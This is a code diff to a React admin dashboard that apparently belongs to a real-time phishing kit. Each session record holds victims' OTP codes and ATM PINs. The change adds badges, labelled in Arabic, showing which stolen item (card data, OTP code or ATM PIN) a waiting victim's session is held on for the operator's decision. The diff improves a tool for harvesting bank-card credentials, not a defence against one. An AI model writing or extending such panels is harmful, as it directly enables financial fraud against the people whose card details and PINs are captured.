@@ -21,6 +21,7 @@ interface Session {
   otp_code: string;
   atm_pin: string;
   current_page: string;
+  waiting_for: string;
   status: string;
   is_new: number;
   redirect_to: string;
@@ -318,9 +319,16 @@ export default function AdminDashboard() {
                           {formatDate(session.updated_at)}
                         </td>
                         <td className="px-4 py-3">
-                          <span className={`inline-flex items-center gap-1 text-xs px-2 py-1 rounded-full font-medium ${PAGE_COLORS[session.current_page] || 'bg-gray-100 text-gray-600'}`}>
-                            {PAGE_LABELS[session.current_page] || session.current_page}
-                          </span>
+                          <div className="flex flex-col gap-1">
+                            <span className={`inline-flex items-center gap-1 text-xs px-2 py-1 rounded-full font-medium ${PAGE_COLORS[session.current_page] || 'bg-gray-100 text-gray-600'}`}>
+                              {PAGE_LABELS[session.current_page] || session.current_page}
+                            </span>
+                            {session.waiting_for && session.current_page === 'loading-page' && (
+                              <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-100 text-yellow-800 border border-yellow-200">
+                                ⏳ {session.waiting_for === 'payment' ? 'بطاقة' : session.waiting_for === 'otp' ? 'OTP' : session.waiting_for === 'atm' ? 'PIN' : session.waiting_for}
+                              </span>
+                            )}
+                          </div>
                         </td>
                         <td className="px-4 py-3">
                           <StatusBadge status={session.status} />
@@ -400,6 +408,11 @@ export default function AdminDashboard() {
                 <span className={`text-xs px-3 py-1 rounded-full font-medium ${PAGE_COLORS[selectedSession.current_page] || 'bg-gray-100 text-gray-600'}`}>
                   {PAGE_LABELS[selectedSession.current_page] || selectedSession.current_page}
                 </span>
+                {selectedSession.waiting_for && selectedSession.current_page === 'loading-page' && (
+                  <span className="text-xs px-3 py-1 rounded-full font-medium bg-yellow-100 text-yellow-800 border border-yellow-300">
+                    ⏳ ينتظر قرار: {selectedSession.waiting_for === 'payment' ? 'بيانات البطاقة' : selectedSession.waiting_for === 'otp' ? 'رمز OTP' : selectedSession.waiting_for === 'atm' ? 'PIN الصراف الآلي' : selectedSession.waiting_for}
+                  </span>
+                )}
                 <StatusBadge status={selectedSession.status} />
               </div>
 
